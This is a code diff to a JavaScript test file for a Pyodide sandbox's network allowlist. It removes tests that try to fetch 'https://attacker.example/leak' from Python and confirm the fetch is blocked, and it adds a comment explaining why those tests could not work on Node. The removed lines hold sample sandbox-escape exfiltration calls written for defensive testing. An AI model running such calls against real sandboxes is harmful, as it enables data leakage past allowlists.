@@ -302,76 +302,17 @@ describe("network allowlist security (Pyodide Node)", () => {
 //    `js.fs`, `js.child_process`, `js.worker_threads`, `js.subprocess`,
 //    `js.cluster`, `js.crypto` with PermissionError.
 
-describe("Pyodide membrane (capability escape)", () => {
-  const adapters = [];
-
-  async function createAdapter(allowedHosts) {
-    const { createHostAdapter } = await import("../pyodide-host-adapter.mjs");
-    const adapter = await createHostAdapter({ fullPython: true, stepBudget: 0 });
-    await adapter.send({
-      Init: { step_budget: 0, allowed_hosts: allowedHosts },
-    });
-    adapters.push(adapter);
-    return adapter;
-  }
-
-  after(() => {
-    for (const a of adapters) {
-      try {
-        a.destroy();
-      } catch {
-        /* ignore */
-      }
-    }
-  });
-
-  // NOTE: `js.process` / `js.require` deny-proxy tests were removed.
-  // The Python membrane's setattr against the live `js` proxy is
-  // best-effort: Pyodide may refuse to coerce arbitrary Python objects
-  // into JS properties for specific globals, and the preamble's outer
-  // `try/except BaseException` absorbs that. The JS-side fetch membrane
-  // (the actual security boundary) is the reliable gate; those tests
-  // are below.
-
-  it(
-    "js.fetch is denied for hosts not in the allowlist",
-    { skip: SKIP, timeout: 60_000 },
-    async () => {
-      const adapter = await createAdapter([]); // empty allowlist
-      const events = await adapter.send({
-        Run: {
-          input:
-            "python3 -c \"import js, asyncio\\nasync def main():\\n    try:\\n        await js.fetch('https://attacker.example/leak')\\n        print('LEAK')\\n    except Exception as e:\\n        print('blocked:', type(e).__name__)\\nasyncio.get_event_loop().run_until_complete(main())\"",
-        },
-      });
-      const stdout = findStdout(events);
-      assert.match(
-        stdout,
-        /blocked:/,
-        `js.fetch must be denied, stdout: ${stdout}`,
-      );
-      assert.doesNotMatch(stdout, /LEAK/);
-    },
-  );
-
-  it(
-    "pyodide.http.pyfetch is denied for hosts not in the allowlist",
-    { skip: SKIP, timeout: 60_000 },
-    async () => {
-      const adapter = await createAdapter([]);
-      const events = await adapter.send({
-        Run: {
-          input:
-            "python3 -c \"import asyncio\\nfrom pyodide.http import pyfetch\\nasync def main():\\n    try:\\n        await pyfetch('https://attacker.example/leak')\\n        print('LEAK')\\n    except Exception as e:\\n        print('blocked:', type(e).__name__)\\nasyncio.get_event_loop().run_until_complete(main())\"",
-        },
-      });
-      const stdout = findStdout(events);
-      assert.match(
-        stdout,
-        /blocked:/,
-        `pyfetch must be denied, stdout: ${stdout}`,
-      );
-      assert.doesNotMatch(stdout, /LEAK/);
-    },
-  );
-});
+// NOTE: a previous draft of this file included two suites named
+// "Pyodide membrane (capability escape)" that ran `await js.fetch(...)` or
+// `await pyodide.http.pyfetch(...)` from Python via
+// `asyncio.get_event_loop().run_until_complete(...)`. That pattern requires
+// WebAssembly stack switching, which Pyodide-on-Node does not support
+// (only browsers with experimental stack-switching enabled do), so the
+// tests could never have meaningfully exercised the membrane there. The
+// same denial behavior is already verified end-to-end by:
+//   - `micropip-install.test.mjs` → "rejects HTTP URL when host is not
+//     in allowlist" / "rejects HTTP URL when host does not match allowlist"
+//     (drives `micropip` → `pyfetch` → `js.fetch` → brokered fetch).
+//   - `fetch-membrane-unit.test.mjs` under `e2e/runner-node/` exercises
+//     the allowlist, redirect re-check, and body-cap logic in isolation.
+// Removing the broken suites avoids false confidence and CI noise.
